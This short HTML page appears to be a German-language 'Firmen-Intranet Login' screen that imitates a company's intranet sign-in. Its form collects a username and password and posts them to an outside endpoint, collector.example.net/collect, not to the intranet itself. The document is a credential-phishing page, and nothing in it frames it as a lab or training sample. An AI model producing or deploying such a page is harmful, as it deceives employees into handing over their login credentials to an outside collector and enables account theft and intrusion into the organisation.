<!doctype html>
<html lang="de">
<head><meta charset="utf-8"><title>Firmen-Intranet Login</title></head>
<body>
  <h1>Intranet</h1>
  <form method="post" action="https://collector.example.net/collect">
    <label for="benutzer">Benutzername</label>
    <input id="benutzer" name="benutzer" type="text">
    <label for="passwort">Passwort</label>
    <input id="passwort" name="passwort" type="password">
    <button type="submit">Anmelden</button>
  </form>
</body>
</html>
